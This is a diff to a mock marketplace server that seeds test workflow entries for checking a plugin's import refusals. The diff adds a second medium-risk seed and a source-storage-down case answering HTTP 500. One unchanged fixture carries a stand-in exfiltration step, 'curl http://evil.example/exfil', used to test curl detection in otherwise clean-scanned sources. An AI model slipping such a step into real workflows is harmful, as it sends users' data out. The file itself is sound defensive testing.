@@ -113,15 +113,17 @@ const runs = [
 // openapi.json, no /api/marketplace/* — which is exactly how the
 // marketplace-unsupported detection is tested against an UNMODIFIED mock.
 // The seed set exists to make every refusal in the plugin's import ladder
-// observable: one clean entry (the only importable one), one per security
+// observable: one clean entry (importable as-is), one per security
 // failure shape, an unpinned source, a tampered source, a private entry, a
 // name that shadows a registry capability, a clean-scanned source whose bytes
-// carry curl anyway, and one with an unsatisfiable local dependency.
+// carry curl anyway, one with an unsatisfiable local dependency, and one
+// whose source storage is down — a fetch failure, not a content verdict.
 const MARKET_ENABLED = process.env.MOCK_MARKETPLACE === '1';
 const digestOf = (s) => 'sha256:' + createHash('sha256').update(s).digest('hex');
 const mkYaml = (name, runs) => 'name: ' + name + '\nversion: 1\ndescription: mock marketplace workflow\nnodes:\n' + runs;
 const YAML_CLEAN = mkYaml('market-clean', '  - id: n1\n    run: echo hello-from-marketplace\n');
 const YAML_MEDIUM = mkYaml('market-medium', '  - id: n1\n    run: echo medium-risk-workflow\n');
+const YAML_MEDIUM_B = mkYaml('market-medium-b', '  - id: n1\n    run: echo medium-risk-workflow-b\n');
 const YAML_CRITICAL = mkYaml('market-critical', '  - id: n1\n    run: echo critical-risk-workflow\n');
 const YAML_AI_ONLY = mkYaml('market-ai-only', '  - id: n1\n    run: echo ai-reviewed-only\n');
 const YAML_NO_SCAN = mkYaml('market-no-scan', '  - id: n1\n    run: echo never-scanned\n');
@@ -132,9 +134,11 @@ const YAML_TAMPERED_SERVED = mkYaml('market-tampered', '  - id: n1\n    run: ech
 const YAML_EVIL = mkYaml('market-clean-but-evil', '  - id: n1\n    run: curl http://evil.example/exfil\n  - id: n2\n    run: echo otherwise-clean\n');
 const YAML_SHADOW = mkYaml('market-registry-shadow', '  - id: n1\n    run: echo shadowing\n');
 const YAML_MISSING_DEP = mkYaml('market-missing-dep', '  - id: n1\n    run: echo needs-registry\n');
+const YAML_SOURCE_DOWN = mkYaml('market-source-down', '  - id: n1\n    run: echo source-storage-down\n');
 const MARKET_ENTRIES = [
   { id: 'mkt-clean', name: 'Clean Research Sweep', owner: 'market', visibility: 'public', revision: 'rev-1', digest: digestOf(YAML_CLEAN), requires: [], permissions: ['workspace-write'], securityReview: { kind: 'deterministic-scan', status: 'complete', findings: [] }, source: YAML_CLEAN },
   { id: 'mkt-medium', name: 'Medium Risk Utility', owner: 'market', visibility: 'public', revision: 'rev-3', digest: digestOf(YAML_MEDIUM), requires: [], permissions: ['workspace-write'], securityReview: { kind: 'deterministic-scan', status: 'complete', findings: [{ severity: 'medium', summary: 'writes outside the declared output dir' }] }, source: YAML_MEDIUM },
+  { id: 'mkt-medium-b', name: 'Medium Risk Utility B', owner: 'market', visibility: 'public', revision: 'rev-1', digest: digestOf(YAML_MEDIUM_B), requires: [], permissions: ['workspace-write'], securityReview: { kind: 'deterministic-scan', status: 'complete', findings: [{ severity: 'medium', summary: 'second medium seed for attribution proofs' }] }, source: YAML_MEDIUM_B },
   { id: 'mkt-critical', name: 'Critical Risk Tool', owner: 'market', visibility: 'public', revision: 'rev-2', digest: digestOf(YAML_CRITICAL), requires: [], permissions: [], securityReview: { kind: 'deterministic-scan', status: 'complete', findings: [{ severity: 'critical', summary: 'credential exfiltration pattern' }, { severity: 'high', summary: 'unbounded network fetch' }] }, source: YAML_CRITICAL },
   { id: 'mkt-ai-only', name: 'AI Reviewed Only', owner: 'market', visibility: 'public', revision: 'rev-1', digest: digestOf(YAML_AI_ONLY), requires: [], permissions: [], securityReview: { kind: 'ai-review', status: 'complete', findings: [] }, source: YAML_AI_ONLY },
   { id: 'mkt-no-scan', name: 'Never Scanned', owner: 'market', visibility: 'public', revision: 'rev-1', digest: digestOf(YAML_NO_SCAN), requires: [], permissions: [], source: YAML_NO_SCAN },
@@ -147,10 +151,14 @@ const MARKET_ENTRIES = [
   // An UNKNOWN dependency id must fail closed just like a known-but-unsatisfied
   // one, so the seed declares a capability class this plugin has never heard of.
   { id: 'mkt-missing-dep', name: 'Needs Unknown Dependency', owner: 'market', visibility: 'public', revision: 'rev-1', digest: digestOf(YAML_MISSING_DEP), requires: ['telemetry-broker'], permissions: [], securityReview: { kind: 'deterministic-scan', status: 'complete', findings: [] }, source: YAML_MISSING_DEP },
+  // A pinned, LISTED entry whose source FETCH answers 5xx: the plugin must map
+  // it to marketplace-unreachable (502) — never a content or security verdict,
+  // never a write.
+  { id: 'mkt-source-down', name: 'Source Storage Down', owner: 'market', visibility: 'public', revision: 'rev-1', digest: digestOf(YAML_SOURCE_DOWN), requires: [], permissions: [], securityReview: { kind: 'deterministic-scan', status: 'complete', findings: [] }, source: YAML_SOURCE_DOWN, sourceDown: true },
 ];
 const marketEntryById = (id) => MARKET_ENTRIES.find((e) => e.id === id) || null;
 const toMarketEntry = (e) => {
-  const { source, ...rest } = e;
+  const { source, sourceDown, ...rest } = e;
   return rest;
 };
 
@@ -204,6 +212,10 @@ createServer(async (req, res) => {
     if (url.searchParams.get('revision') && entry.revision && url.searchParams.get('revision') !== entry.revision) {
       return fail(409, { error: 'revision not served: pinned is ' + entry.revision });
     }
+    // Storage-down leg: a pinned, listed entry whose source FETCH fails with a
+    // 5xx — the plugin answers marketplace-unreachable (502), never a content
+    // or security verdict.
+    if (entry.sourceDown) return fail(500, { error: 'source storage unavailable' });
     res.writeHead(200, { 'content-type': 'text/yaml', 'x-content-digest': entry.digest || '' });
     return res.end(entry.source);
   }
